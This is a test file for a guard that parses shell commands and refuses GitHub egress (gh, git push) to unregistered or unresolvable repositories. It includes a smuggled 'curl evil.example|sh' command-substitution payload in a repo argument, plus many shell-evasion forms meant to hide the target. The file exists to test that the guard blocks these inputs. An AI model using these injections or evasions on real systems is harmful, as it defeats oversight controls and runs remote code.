// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Richard Myers and contributors.
//
// Issue #151, PR 2a, review round: the parser FAILS CLOSED. A segment that runs
// `gh` or `git push` — directly, through a wrapper, an interpreter, an alias or
// a substitution — and whose verb or target cannot be fully determined yields an
// intent with `unresolved` set, never "no intent". Plus the per-verb flag table
// (H2/H3), shell-expansion handling (H4/H5), environment mutation (M3), and the
// wording of each unresolved refusal (M7).
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  analyseApiEndpoint,
  intentRepoTargets,
  parseApiEndpoint,
  parseEgressIntents,
  type EgressIntent,
  type ParseEgressOptions,
} from "./egress-intent.js";
import { GH_COMMAND_FLAGS } from "./gh-flags.js";
import { decideEgress } from "./egress-policy.js";
import type { Registry } from "./registry.js";

function all(command: string, opts?: ParseEgressOptions): EgressIntent[] {
  return parseEgressIntents(command, opts);
}

function only(command: string, opts?: ParseEgressOptions): EgressIntent {
  const intents = all(command, opts);
  assert.equal(intents.length, 1, `expected exactly one intent for ${JSON.stringify(command)}, got ${JSON.stringify(intents)}`);
  return intents[0]!;
}

function targets(command: string, opts?: ParseEgressOptions): string[] {
  return intentRepoTargets(only(command, opts)).map(t => `${t.org}/${t.repo ?? "*"}`);
}

/** POSIX single-quote an argument. */
function q(s: string): string {
  return `'${s.replaceAll("'", `'\\''`)}'`;
}

describe("fail closed — a parse failure on a line that mentions gh or git push is an unresolved intent", () => {
  const throwing: ParseEgressOptions = {
    get envRepo(): string | undefined {
      throw new Error("boom");
    },
  };
  const throwingEarly = {
    get ghAliases(): never {
      throw new Error("boom");
    },
  } as ParseEgressOptions;

  it("an exception inside a segment gives a sentinel for that segment", () => {
    const i = only("gh issue create -R stranger/r -b x", throwing);
    assert.equal(i.verb, "gh-unknown");
    assert.equal(i.unresolved, "unparsed-shape");
    const g = only("git push origin main", throwing);
    assert.equal(g.verb, "git-push");
    assert.equal(g.unresolved, "unparsed-shape");
  });

  it("an exception outside the segments gives a sentinel for the line", () => {
    const i = only("ls && gh issue create -R stranger/r -b x", throwingEarly);
    assert.equal(i.verb, "gh-unknown");
    assert.equal(i.unresolved, "unparsed-shape");
    assert.equal(only("git push origin main", throwingEarly).verb, "git-push");
  });

  it("…but a line with neither gh nor git push still yields nothing", () => {
    assert.deepEqual(all("ls -la && echo done", throwing), []);
    assert.deepEqual(all("git status && echo ghost", throwingEarly), []);
    assert.deepEqual(all("echo my-gh-thing", throwingEarly), []);
  });
});

describe("fail closed — unknown gh words and command groups (C1, M4)", () => {
  const aliases = new Map([["ic", "issue create"]]);

  it("a built-in group with no shape here is unresolved: project, agent-task, codespace, cache, ssh-key, copilot, extension", () => {
    for (const c of [
      "gh project item-create 1 --owner stranger --title t --body secret",
      "gh agent-task create -R stranger/r 'do it'",
      "gh codespace create -R stranger/r",
      "gh cache delete --all -R stranger/r",
      "gh ssh-key add k.pub",
      "gh copilot agent run x",
      "gh extension install stranger/gh-x",
    ]) {
      const i = only(c, { ghAliases: aliases });
      assert.equal(i.verb, "gh-unknown", c);
      assert.equal(i.unresolved, "unknown-shape", c);
    }
  });

  it("explicit read-only groups stay no-intent", () => {
    for (const c of [
      "gh search issues foo",
      "gh browse",
      "gh status",
      "gh auth status",
      "gh help pr",
      "gh completion -s bash",
      "gh alias list",
      "gh config get editor",
      "gh --version",
      "gh",
      "gh --help",
    ]) {
      assert.deepEqual(all(c, { ghAliases: aliases }), [], c);
    }
  });

  it("an unknown first word, or one that a brace expansion or variable hides, is unresolved", () => {
    for (const c of ["gh {issue,} create -R stranger/r -b x", "gh $CMD create -R stranger/r", "gh `echo issue` create", "gh issuue create"]) {
      const i = only(c, { ghAliases: aliases });
      assert.equal(i.unresolved, "gh-alias", c);
    }
  });
});

describe("fail closed — wrappers and interpreters", () => {
  const stranger = "gh issue create -R stranger/r -b x";

  it("wrappers are looked through: the inner command's own target is read", () => {
    const wrapped = [
      `nice ${stranger}`,
      `nice -n 10 ${stranger}`,
      `nice -n10 ${stranger}`,
      `timeout 30 ${stranger}`,
      `timeout -s KILL 30 ${stranger}`,
      `timeout --signal=KILL 30s ${stranger}`,
      `stdbuf -oL ${stranger}`,
      `stdbuf -o L -e 0 ${stranger}`,
      `ionice -c 2 -n 4 ${stranger}`,
      `caffeinate ${stranger}`,
      `caffeinate -t 5 ${stranger}`,
      `exec -a NAME ${stranger}`,
      `command ${stranger}`,
      `builtin ${stranger}`,
      `sudo ${stranger}`,
      `sudo -u deploy ${stranger}`,
      `doas ${stranger}`,
      `env ${stranger}`,
      `env -i FOO=1 ${stranger}`,
      `env -u HOME ${stranger}`,
      `nohup ${stranger}`,
      `time ${stranger}`,
      `nice timeout 5 sudo -u x env A=b ${stranger}`,
    ];
    for (const c of wrapped) {
      const i = only(c);
      assert.equal(i.verb, "gh-issue-create", c);
      assert.equal(i.repoFlag, "stranger/r", c);
      assert.equal(i.unresolved, undefined, c);
    }
  });

  it("git push through wrappers is still a git push", () => {
    for (const c of ["nice git push origin main", "timeout 5 git push origin main", "sudo -u x git push origin main", "exec -a g git push origin main"]) {
      assert.equal(only(c).verb, "git-push", c);
    }
  });

  it("env -S splits its string and runs it", () => {
    const i = only("env -S 'GH_REPO=stranger/r gh issue create -b x'");
    assert.equal(i.envRepo, "stranger/r");
    assert.equal(only("env -S'gh issue create -R stranger/r'").repoFlag, "stranger/r");
    assert.equal(only("env --split-string='gh issue create -R stranger/r' -b x").repoFlag, "stranger/r");
    assert.equal(only("env -S 'gh issue' create -R stranger/r").verb, "gh-issue-create");
  });

  it("xargs-fed arguments are invisible: the intent is unresolved", () => {
    for (const c of ["xargs gh issue create -b x -R stranger/r < f", "ls | xargs -n1 gh pr close", "xargs -I{} gh pr close {} -R a/b", "xargs git push origin"]) {
      const i = only(c);
      assert.equal(i.unresolved, "unparsed-shape", c);
    }
  });

  it("sh|bash|zsh|dash -c text is parsed as a command line", () => {
    for (const shell of ["sh", "bash", "zsh", "dash", "bash -l", "bash -e", "/bin/bash", "sudo bash"]) {
      const i = only(`${shell} -c ${q(stranger)}`);
      assert.equal(i.verb, "gh-issue-create", shell);
      assert.equal(i.repoFlag, "stranger/r", shell);
    }
    assert.equal(only(`bash -lc ${q(stranger)}`).repoFlag, "stranger/r");
    assert.equal(only(`bash -ec ${q("git push origin main")}`).verb, "git-push");
    assert.equal(only(`bash -c ${q("echo hi; gh pr comment 5 -b x && echo done")}`).verb, "gh-pr-comment");
  });

  it("a shell that is not given text, or text with no gh/git, yields nothing", () => {
    assert.deepEqual(all("bash script.sh"), []);
    assert.deepEqual(all(`bash -c ${q("echo hello")}`), []);
    assert.deepEqual(all("bash"), []);
  });

  it("eval parses its arguments", () => {
    assert.equal(only(`eval ${q(stranger)}`).repoFlag, "stranger/r");
    assert.equal(only("eval gh issue create -R stranger/r -b x").repoFlag, "stranger/r");
    assert.equal(only(`eval "git push origin main"`).verb, "git-push");
  });

  it("a nested command keeps the chain's position (joinedBy, cd taint)", () => {
    const [a] = all(`cd /x && bash -c ${q("gh issue create -R stranger/r -b x")}`);
    assert.ok(a);
    assert.equal(a.precededByCd, true);
    assert.equal(a.joinedBy, "&&");
    assert.equal(a.segmentIndex, 1);
  });

  it("command substitutions run: $(…) and backticks, anywhere in the line", () => {
    for (const c of [
      `echo "$(${stranger})"`,
      `echo $(${stranger})`,
      `x=$(${stranger})`,
      `echo \`${stranger}\``,
      `bash -c ${q(`echo $(${stranger})`)}`,
      `ls $(echo $(${stranger}))`,
    ]) {
      const i = only(c);
      assert.equal(i.verb, "gh-issue-create", c);
      assert.equal(i.repoFlag, "stranger/r", c);
    }
    assert.equal(only("echo $(git push origin main)").verb, "git-push");
    assert.deepEqual(all("echo $(date) `uname`"), []);
  });

  it("nesting deeper than the cap is unresolved when it mentions gh or git push, and nothing when it does not", () => {
    let deepGh = stranger;
    let deepGit = "git push origin main";
    let deepOther = "echo hello";
    for (let k = 0; k < 8; k++) {
      deepGh = `bash -c ${q(deepGh)}`;
      deepGit = `bash -c ${q(deepGit)}`;
      deepOther = `bash -c ${q(deepOther)}`;
    }
    const g = only(deepGh);
    assert.equal(g.verb, "gh-unknown");
    assert.equal(g.unresolved, "unparsed-shape");
    const p = only(deepGit);
    assert.equal(p.verb, "git-push");
    assert.equal(p.unresolved, "unparsed-shape");
    assert.deepEqual(all(deepOther), []);
    // Within the cap it still resolves.
    assert.equal(only(`bash -c ${q(`bash -c ${q(stranger)}`)}`).repoFlag, "stranger/r");
  });

  it("a brace-expanded command word that can be gh or git push is unresolved", () => {
    for (const c of ["{gh,} issue create -R stranger/r", "g{h,x} issue create", "{git,} push origin main", "{foo,gh} pr close 5"]) {
      assert.equal(only(c).unresolved, "unparsed-shape", c);
    }
    assert.deepEqual(all("mkdir {a,b}"), []);
    assert.deepEqual(all("echo {gh,x}"), []);
    assert.deepEqual(all("{git,} status"), []);
  });

  it("the environment reaches nested text: a GH_REPO prefix applies inside bash -c", () => {
    assert.equal(only(`GH_REPO=stranger/r bash -c ${q("gh issue create -b x")}`).envRepo, "stranger/r");
    assert.equal(only(`bash -c ${q("gh issue create -b x")}`, { envRepo: "stranger/r" }).envRepo, "stranger/r");
    assert.equal(only(`export GH_REPO=a/b && bash -c ${q("gh issue create -b x")}`).unresolved, "env-override");
  });
});

describe("gh long and short flags come from the per-verb table (H2, H3)", () => {
  it("the table reflects the manual for the entries that matter", () => {
    const pinned: Array<[string, string, boolean]> = [
      // [command, flag, takes a value]
      ["pr review", "--comment", false],
      ["pr review", "--approve", false],
      ["pr review", "--request-changes", false],
      ["pr review", "--body", true],
      ["workflow run", "--json", false],
      ["workflow run", "--ref", true],
      ["repo edit", "--template", false], // the manual: "Make the repository available as a template repository"
      ["repo edit", "--homepage", true],
      ["repo fork", "--remote", false],
      ["repo fork", "--remote-name", true],
      ["repo fork", "--org", true],
      ["repo create", "--template", true],
      ["repo create", "--remote", true],
      ["repo create", "--source", true],
      ["repo create", "--clone", false],
      ["pr create", "--reviewer", true],
      ["pr create", "--fill", false],
      ["label clone", "--force", false],
      ["issue develop", "--branch-repo", true],
      ["secret set", "--org", true],
      ["secret set", "--user", false],
    ];
    for (const [cmd, flag, takesValue] of pinned) {
      const entry = GH_COMMAND_FLAGS[cmd];
      assert.ok(entry, cmd);
      assert.equal(entry.value.includes(flag), takesValue, `${cmd} ${flag}`);
    }
    // The same letter, a different meaning per command.
    assert.ok(GH_COMMAND_FLAGS["pr review"]!.boolShort.includes("r"));
    assert.ok(GH_COMMAND_FLAGS["pr create"]!.valueShort.includes("r"));
    assert.ok(GH_COMMAND_FLAGS["repo create"]!.valueShort.includes("p"));
    assert.ok(GH_COMMAND_FLAGS["api"]!.valueShort.includes("p"));
  });

  it("(was: swallowed the repository) a boolean long flag never takes the next token", () => {
    assert.equal(only("gh pr review 5 --comment -R stranger/r -b x").repoFlag, "stranger/r");
    assert.equal(only("gh pr review --comment https://github.com/stranger/r/pull/5 -b x").positionalRepo, "stranger/r");
    assert.equal(only("gh pr review --approve https://github.com/stranger/r/pull/5").positionalRepo, "stranger/r");
    assert.equal(only("gh workflow run --json -R stranger/r deploy.yml").repoFlag, "stranger/r");
    assert.equal(only("gh repo fork acme/x --remote --org stranger").positionalRepo, "stranger");
    assert.equal(only("gh repo edit --template stranger/r --description x").positionalRepo, "stranger/r");
  });

  it("(H3) gh repo create -p is --template and takes a value, so the positional index holds", () => {
    assert.equal(only("gh repo create -p acme/tmpl stranger/new --public").positionalRepo, "stranger/new");
    assert.equal(only("gh repo create stranger/new -p acme/tmpl --public").positionalRepo, "stranger/new");
    assert.equal(only("gh repo create --template acme/tmpl stranger/new --public").positionalRepo, "stranger/new");
    assert.equal(only("gh repo create -pacme/tmpl stranger/new").positionalRepo, "stranger/new");
    assert.equal(
      only("gh repo create -d desc -g Node -h http://h -l mit -r origin -s . -t team -p acme/tmpl -c stranger/new --public").positionalRepo,
      "stranger/new",
    );
    // `-c` is --clone here (boolean), so it must not swallow the name.
    assert.equal(only("gh repo create -c stranger/new").positionalRepo, "stranger/new");
  });

  it("(H3) every verb in the repository table: its shorthand letters do not displace the positional", () => {
    const cases: Array<[string, string, string]> = [
      ["gh repo edit -d desc -h home stranger/r --visibility private", "positionalRepo", "stranger/r"],
      ["gh repo edit stranger/r -d desc -h home", "positionalRepo", "stranger/r"],
      ["gh repo sync -b main -s acme/x stranger/r", "positionalRepo", "stranger/r"],
      ["gh repo sync stranger/r --source acme/x --branch main --force", "positionalRepo", "stranger/r"],
      ["gh repo delete --yes stranger/r", "positionalRepo", "stranger/r"],
      ["gh repo archive -y stranger/r", "positionalRepo", "stranger/r"],
      ["gh repo unarchive -y stranger/r", "positionalRepo", "stranger/r"],
      ["gh repo fork --fork-name n --org stranger --clone acme/x", "positionalRepo", "stranger"],
      ["gh issue transfer -R acme/x 5 stranger/r", "positionalRepo", "stranger/r"],
      ["gh secret set -a actions -b v -e prod -f .env -o stranger -r a,b -v selected NAME", "positionalRepo", "stranger"],
      ["gh secret set NAME -ostranger", "positionalRepo", "stranger"],
      ["gh secret delete -e prod -o stranger NAME", "positionalRepo", "stranger"],
      ["gh variable set -b v -e prod -o stranger NAME", "positionalRepo", "stranger"],
      ["gh variable delete -o stranger NAME", "positionalRepo", "stranger"],
      ["gh issue develop -b main -n br --branch-repo stranger/r 5", "positionalRepo", "stranger/r"],
      ["gh pr comment -b hi -F body.md https://github.com/stranger/r/pull/5", "positionalRepo", "stranger/r"],
      ["gh pr merge -s -d -t subj -b body -A a@b https://github.com/stranger/r/pull/5", "positionalRepo", "stranger/r"],
      ["gh pr edit -t t -a me -l bug -m ms -p proj -r rev https://github.com/stranger/r/pull/5", "positionalRepo", "stranger/r"],
      ["gh pr close -c 'bye' -d https://github.com/stranger/r/pull/5", "positionalRepo", "stranger/r"],
      ["gh issue close -c 'bye' -r completed https://github.com/stranger/r/issues/5", "positionalRepo", "stranger/r"],
    ];
    for (const [cmd, field, expected] of cases) {
      assert.equal(only(cmd)[field as "positionalRepo"], expected, cmd);
    }
  });

  it("pflag takes the next token as a value even when it starts with a dash", () => {
    // `-t` takes `-R` as the title, so `stranger/r` is a stray positional and nothing names a repo.
    assert.equal(only("gh pr create -t -R stranger/r -b x").repoFlag, undefined);
    assert.equal(only("gh issue create --body --repo stranger/r --title t").repoFlag, undefined);
    assert.equal(only("gh issue create --title '--repo' --repo stranger/r").repoFlag, "stranger/r");
    // …and a BOOLEAN flag does not.
    assert.equal(only("gh pr create --draft -R stranger/r").repoFlag, "stranger/r");
    assert.equal(only("gh pr create -d -R stranger/r").repoFlag, "stranger/r");
  });

  it("-R/--repo is a value flag on every verb, even where the manual omits it", () => {
    assert.equal(only("gh repo edit -R stranger/r --description x").repoFlag, "stranger/r");
    assert.equal(only("gh gist create -R stranger/r f.txt").repoFlag, "stranger/r");
  });
});

describe("shell expansions in repository slots (H4)", () => {
  it("a selector positional with an expansion may be a URL to anywhere: opaque-repo", () => {
    for (const c of [
      'gh pr comment "$URL" -b x',
      "gh pr comment `cat u` -b x",
      "gh pr comment $(cat u) -b x",
      'gh issue close "$N"',
      "gh pr merge ${PR} --squash",
      'gh issue transfer 5 "$DEST"',
    ]) {
      assert.equal(only(c).unresolved, "opaque-repo", c);
    }
    // A literal number is fine; so is a variable inside a flag value.
    assert.equal(only("gh pr comment 5 -b x").unresolved, undefined);
    assert.equal(only('gh pr comment 5 -b "$BODY"').unresolved, undefined);
  });

  it("a gh api endpoint with an expansion in its first three segments is unresolved", () => {
    for (const c of [
      'gh api -X POST "$EP" -f a=b',
      "gh api -X POST `echo repos/a/b/issues` -f a=b",
      'gh api -X POST "repos/$O/r/issues" -f a=b',
      'gh api -X POST "repos/stranger/$R/issues" -f a=b',
      'gh api -X POST "$KIND/stranger/r/issues" -f a=b',
      'gh api -X POST "orgs/$O/repos" -f a=b',
      'gh api -X POST "https://$HOST/repos/a/b/issues" -f a=b',
    ]) {
      assert.equal(only(c).unresolved, "opaque-repo", c);
    }
    // (In the QUERY an expansion cannot change which repository is addressed; in the path it can.)
    assert.equal(only('gh api -X POST "repos/stranger/r/issues?x=$Y" -f a=b').unresolved, undefined);
    for (const c of ['gh api -X POST "repos/stranger/r/issues/$N/comments" -f a=b', 'gh api -X POST "repos/stranger/r/issues/$(cat n)" -f a=b']) {
      assert.equal(only(c).unresolved, "opaque-repo", c);
    }
    assert.equal(parseApiEndpoint("repos/stranger/r/issues/$N"), null);
    assert.deepEqual(parseApiEndpoint("repos/stranger/r/issues?x=$N"), { org: "stranger", repo: "r" });
    assert.equal(analyseApiEndpoint("$EP").kind, "opaque");
  });

  it("repos/ and orgs/ are matched in any case: Repos/stranger/r names stranger/r", () => {
    for (const e of ["Repos/stranger/r/issues", "REPOS/Stranger/R/issues", "rEpOs/stranger/r.git"]) {
      assert.deepEqual(parseApiEndpoint(e), { org: "stranger", repo: "r" }, e);
    }
    assert.deepEqual(parseApiEndpoint("ORGS/Stranger/repos"), { org: "stranger", repo: null });
    assert.deepEqual(parseApiEndpoint("https://api.github.com/Repos/stranger/r/issues"), { org: "stranger", repo: "r" });
    assert.deepEqual(parseApiEndpoint("API/V3/Repos/stranger/r/issues"), { org: "stranger", repo: "r" });
    assert.equal(analyseApiEndpoint("Repos/{owner}/{repo}/issues").kind, "cwd");
    assert.equal(analyseApiEndpoint("Repos/{branch}/r/issues").kind, "opaque");
  });
});

describe("tokeniser: assignments and quoting forms (H5)", () => {
  it("NAME+=value is an assignment, including GH_REPO+=", () => {
    assert.equal(only("GH_REPO+=stranger/r gh issue create -b x").envRepo, "stranger/r");
    assert.equal(only("FOO+=1 GH_REPO+=stranger/r gh issue create -b x").envRepo, "stranger/r");
    // Appended to what the environment already holds, the result is not a repository.
    assert.equal(only("GH_REPO+=stranger/r gh issue create -b x", { envRepo: "acme/x" }).unresolved, "opaque-repo");
    assert.equal(only("GH_REPO=acme/x GH_REPO+=/y gh issue create -b x").unresolved, "opaque-repo");
    // …but a suffix that still makes a repository is that repository: `acme/x` + `y` is `acme/xy`.
    assert.equal(only("GH_REPO=acme/x GH_REPO+=y gh issue create -b x").envRepo, "acme/xy");
    assert.equal(only("GH_REPO+=stranger/r; gh issue create -b x").unresolved, "env-override");
    assert.equal(only("env GH_REPO+=stranger/r gh issue create -b x").envRepo, "stranger/r");
  });

  it("$'…' and $\"…\" are quoted words, with their escapes decoded", () => {
    for (const c of [
      "gh $'issue' create -R stranger/r -b x",
      "gh $'is\\x73ue' create -R stranger/r -b x",
      "gh $'\\151ssue' create -R stranger/r -b x",
      "gh $'\\u0069ssue' create -R stranger/r -b x",
      'gh $"issue" create -R stranger/r -b x',
      "$'gh' issue create -R stranger/r -b x",
      "gh issue create -R $'stranger/r' -b x",
    ]) {
      const i = only(c);
      assert.equal(i.verb, "gh-issue-create", c);
      assert.equal(i.repoFlag, "stranger/r", c);
    }
    assert.equal(only("gh issue create -b $'it\\'s' -R stranger/r").repoFlag, "stranger/r");
    assert.equal(only("gh issue create -b $'a\\nb' -R stranger/r").repoFlag, "stranger/r");
    assert.equal(only("git $'push' origin main").verb, "git-push");
  });

  it("git -C is cumulative, as in git", () => {
    assert.equal(only("git -C /a -C b push origin main").cwdOverride, "/a/b");
    assert.equal(only("git -C /a -C /b push origin main").cwdOverride, "/b");
    assert.equal(only("git -C /a -C ../b push origin main").cwdOverride, "/b");
    assert.equal(only("git -C /a -C '' push origin main").cwdOverride, "/a");
    assert.equal(only("git -C /a -Cb -C c push origin main").cwdOverride, "/a/b/c");
    assert.equal(only("git -C rel push origin main").cwdOverride, "rel");
    assert.equal(only("git push origin main").cwdOverride, undefined);
  });

  it("--git-dir and GIT_DIR name the repository whose remotes git uses", () => {
    assert.equal(only("git --git-dir=/x/.git push origin main").cwdOverride, "/x/.git");
    assert.equal(only("git --git-dir /x/.git push origin main").cwdOverride, "/x/.git");
    assert.equal(only("GIT_DIR=/x/.git git push origin main").cwdOverride, "/x/.git");
    assert.equal(only("env GIT_DIR=/x/.git git push origin main").cwdOverride, "/x/.git");
    assert.equal(only("git -C /a --git-dir=.git push origin main").cwdOverride, "/a/.git");
    assert.equal(only("git -C /a --git-dir=/x/.git push origin main").cwdOverride, "/x/.git");
    // The flag beats the variable.
    assert.equal(only("GIT_DIR=/y/.git git --git-dir=/x/.git push origin main").cwdOverride, "/x/.git");
    // GIT_WORK_TREE alone does not move the config.
    assert.equal(only("GIT_WORK_TREE=/w git push origin main").cwdOverride, undefined);
    assert.equal(only("git --work-tree=/w push origin main").cwdOverride, undefined);
    assert.equal(only("git --work-tree /w push origin main").remote, "origin");
  });

  it("a git dir or -C the parser cannot name is unresolved", () => {
    for (const c of [
      'git --git-dir="$D" push origin main',
      "git --git-dir=$D push origin main",
      "GIT_DIR=$D git push origin main",
      'git -C "$D" push origin main',
      "git -C $(pwd)/x push origin main",
      "GIT_DIR+=x git push origin main",
    ]) {
      assert.equal(only(c).unresolved, "unparsed-shape", c);
    }
    assert.equal(only("git -C /a push origin main").unresolved, undefined);
  });
});

describe("environment mutation in an earlier segment (M3)", () => {
  const later = "gh issue create -b x";

  it("each form makes a later gh intent without an explicit target unresolved: env-override", () => {
    for (const c of [
      "unset GH_REPO",
      "unset -v GH_REPO",
      "env -u GH_REPO true",
      "env --unset=GH_REPO true",
      "env --unset GH_REPO true",
      "eval 'export GH_REPO=stranger/r'",
      "eval \"$SETUP\"",
      "source ./env.sh",
      ". ./env.sh",
      "set -a",
      "set -ae",
      "set -o allexport",
      "read GH_REPO",
      "read -r GH_REPO",
      "printf -v GH_REPO %s stranger/r",
      "export GH_REPO=stranger/r",
      "export GH_REPO",
      "declare -x GH_REPO=stranger/r",
      "readonly GH_REPO=stranger/r",
      "GH_REPO=stranger/r",
      "GH_REPO+=r",
    ]) {
      for (const joiner of ["&&", ";", "\n", "||"]) {
        const intents = all(`${c} ${joiner} ${later}`);
        assert.equal(intents.length, 1, c);
        assert.equal(intents[0]!.unresolved, "env-override", `${c} ${JSON.stringify(joiner)}`);
      }
    }
  });

  it("…unless the gh command names its target itself", () => {
    for (const c of ["unset GH_REPO", "source ./env.sh", "eval 'x'", "set -a", "read GH_REPO"]) {
      assert.equal(only(`${c} && gh issue create --repo acme/x -b x`).unresolved, undefined, c);
      assert.equal(only(`${c} && gh pr comment https://github.com/acme/x/pull/5 -b x`).unresolved, undefined, c);
      assert.equal(only(`${c} && gh api -X POST repos/acme/x/issues -f a=b`).unresolved, undefined, c);
    }
  });

  it("unrelated builtins do not mark anything", () => {
    for (const c of ["unset FOO", "read X", "read -r LINE", "printf '%s' hi", "printf -v OTHER x", "set -e", "set -eu", "export FOO=1", "cd /tmp", "env FOO=1 true"]) {
      assert.equal(only(`${c} && ${later}`).unresolved, undefined, c);
    }
  });

  it("nested text is judged in the same chain: an export inside bash -c reaches a later gh in that text", () => {
    assert.equal(only(`bash -c ${q("export GH_REPO=a/b && gh issue create -b x")}`).unresolved, "env-override");
    // …and an earlier segment of the OUTER line reaches the nested text.
    assert.equal(only(`unset GH_REPO && bash -c ${q(later)}`).unresolved, "env-override");
  });

  it("the segment that mutates is not itself marked, only the ones after it", () => {
    const intents = all(`eval ${q("gh issue create -R stranger/r -b x")} && ${later}`);
    assert.equal(intents.length, 2);
    assert.equal(intents[0]!.unresolved, undefined);
    assert.equal(intents[0]!.repoFlag, "stranger/r");
    assert.equal(intents[1]!.unresolved, "env-override");
  });
});

describe("unresolved refusals say what is wrong, and carry nothing from the command (M7)", () => {
  const REGISTRY = {
    engagements: [],
    alwaysBlock: [],
    personalOrgs: ["acme"],
    schemaVersion: 2,
  } as unknown as Registry;

  function refuse(command: string, opts?: ParseEgressOptions) {
    const d = decideEgress({
      intents: parseEgressIntents(command, opts),
      cwd: "/work/svc",
      registry: REGISTRY,
      registryState: "loaded",
      humanPresent: false,
      capabilities: { ask: false },
      scanPayload: () => 0,
      findApproval: () => null,
    });
    assert.equal(d.action, "deny", command);
    assert.ok(d.action === "deny");
    assert.equal(d.code, "UNREGISTERED_OWNER_EGRESS", command);
    return d;
  }

  const cases: Array<{ name: string; command: string; opts?: ParseEgressOptions; unresolved: string; what: RegExp; why: RegExp; fix: RegExp }> = [
    {
      name: "env-override",
      command: "export GH_REPO=secret-org/secret-repo && gh issue create --body x",
      unresolved: "env-override",
      what: /^gh issue create \(unresolved destination\): refused\./,
      why: /changes GH_REPO/,
      fix: /with a literal --repo <owner>\/<repo>, and run the environment change as its own call/,
    },
    {
      name: "gh-alias (unknown first word)",
      command: "gh secret-alias-name --body x",
      unresolved: "gh-alias",
      what: /^gh \(unrecognised command\) \(unresolved destination\): refused\./,
      why: /not a built-in gh command and not an alias repo-aegis can read/,
      fix: /the built-in command with a literal repository/,
    },
    {
      name: "opaque-repo",
      command: 'gh issue create --repo "$SECRET_REPO_VAR" --body x',
      unresolved: "opaque-repo",
      what: /^gh issue create \(unresolved destination\): refused\./,
      why: /not a literal <owner>\/<repo>/,
      fix: /the command with a literal --repo <owner>\/<repo> \(for gh api, the repos\/<owner>\/<repo>\/… endpoint\)/,
    },
    {
      name: "unknown-shape",
      command: "gh project item-create 1 --owner secret-org --title t",
      unresolved: "unknown-shape",
      what: /^gh \(unrecognised command\) \(unresolved destination\): refused\./,
      why: /writes somewhere repo-aegis has no way to read/,
      fix: /a built-in command that repo-aegis models/,
    },
    {
      name: "ambiguous-target",
      command: "gh issue transfer 5 secret-org/secret-repo --repo acme/x",
      unresolved: "ambiguous-target",
      what: /^gh issue edit \(unresolved destination\): refused\./,
      why: /names more than one repository/,
      fix: /the command naming a single repository/,
    },
    {
      name: "unparsed-shape",
      command: "xargs gh pr close -R secret-org/secret-repo",
      unresolved: "unparsed-shape",
      what: /^gh pr edit \(unresolved destination\): refused\./,
      why: /could not take this command line apart/,
      fix: /a single plain command with literal arguments/,
    },
    {
      name: "gh-alias (shell alias)",
      command: "gh sh",
      opts: { ghAliases: new Map([["sh", "!echo secret-org"]]) },
      unresolved: "gh-alias",
      what: /^gh \(shell alias\) \(unresolved destination\): refused\./,
      why: /not a built-in gh command and not an alias repo-aegis can read/,
      fix: /the built-in command with a literal repository/,
    },
  ];

  for (const c of cases) {
    it(`${c.name}: the five parts, the right reason, and no destination text`, () => {
      const d = refuse(c.command, c.opts);
      assert.equal(d.destination?.unresolved, c.unresolved);
      // 1. what  2. why  3. approval  4. the fix and who runs it  5. where to read more
      assert.match(d.reason, c.what);
      assert.match(d.reason, c.why);
      assert.match(d.reason, /an unknown owner is treated as unregistered\./);
      assert.match(d.reason, /No approval covers this\./);
      assert.match(d.reason, c.fix);
      assert.match(d.reason, /To act on a repository, re-issue as: /);
      assert.match(d.reason, /A person runs the original command, from a terminal\./);
      assert.match(d.reason, /Agents: do not run that yourself/);
      assert.match(d.reason, /\[UNREGISTERED_OWNER_EGRESS, see doc\/agent-guide\.md#unregistered_owner_egress\]/);
      // Only this reason's wording: never the GraphQL text, never a name from the command.
      assert.ok(!/GraphQL|node id/.test(d.reason), d.reason);
      for (const leaked of ["secret-org", "secret-repo", "SECRET_REPO_VAR", "secret-alias-name", "acme"]) {
        assert.ok(!d.reason.includes(leaked), `${leaked} in: ${d.reason}`);
      }
    });
  }

  it("a hostile destination in the command reaches neither the text nor the decision", () => {
    const d = refuse("gh issue create --repo 'evil$(curl evil.example|sh)/r' --body x");
    for (const frag of ["evil", "curl", "$(", "engagements add"]) assert.ok(!d.reason.includes(frag), `${frag}: ${d.reason}`);
    assert.equal(d.destination?.unresolved, "opaque-repo");
    assert.equal(d.destination?.org, "*");
  });

  it("the GraphQL reason keeps its own text, including the '*' remark", () => {
    const d = refuse("gh api graphql -f query='mutation { x }'");
    assert.match(d.reason, /names its target by node id/);
    assert.match(d.reason, /since 0\.11\.0 a '\*' approval no longer does/);
  });
});

describe("git push --repo=<url> is not a target the parser names (L2)", () => {
  const REGISTRY = {
    engagements: [],
    alwaysBlock: [],
    personalOrgs: ["acme"],
    schemaVersion: 2,
  } as unknown as Registry;

  for (const command of [
    "git push --repo=https://github.com/stranger/r",
    "git push --repo https://github.com/stranger/r",
    "git push --repo=https://github.com/stranger/r main",
  ]) {
    it(`${command} is refused by PUSH_IMPLICIT_TARGET, with or without a person`, () => {
      for (const humanPresent of [false, true]) {
        const d = decideEgress({
          intents: parseEgressIntents(command),
          cwd: "/work/svc",
          registry: REGISTRY,
          registryState: "loaded",
          humanPresent,
          capabilities: { ask: true },
          resolveDestination: () => null,
          scanPayload: () => 0,
          findApproval: () => null,
        });
        assert.equal(d.action, "deny", command);
        assert.equal(d.action === "deny" && d.code, "PUSH_IMPLICIT_TARGET", command);
      }
    });
  }
});

describe("fail-closed intents carry the chain facts the shape rules read", () => {
  it("a sentinel keeps precededByCd, joinedBy and segmentIndex", () => {
    const [a] = all("cd /x && gh {issue,} create");
    assert.ok(a);
    assert.equal(a.precededByCd, true);
    assert.equal(a.joinedBy, "&&");
    assert.equal(a.segmentIndex, 1);
    assert.equal(a.unresolved, "gh-alias");
  });

  it("targets of an unresolved intent are never invented", () => {
    assert.deepEqual(targets("gh issue create --repo \"$R\" -b x"), []);
  });
});

describe("performance: the new handling stays linear", () => {
  it("long and pathological inputs finish quickly", () => {
    const N = 200_000;
    const inputs = [
      "gh issue create -R " + "a".repeat(N),
      "gh issue create -b " + "$(".repeat(N / 2),
      "echo " + "$()".repeat(N / 3),
      "echo " + "`".repeat(N),
      "gh issue create -b " + "$'".repeat(N / 2),
      "bash -c " + q("bash -c ").repeat(50) + "x",
      "{" + "a,".repeat(N / 2) + "}",
      "g{h," + "x,".repeat(N / 2) + "} issue create",
      "FOO+=1 ".repeat(N / 7) + "gh issue create",
      "eval ".repeat(N / 5) + "gh issue create",
      "env -S ".repeat(2000) + "gh issue create",
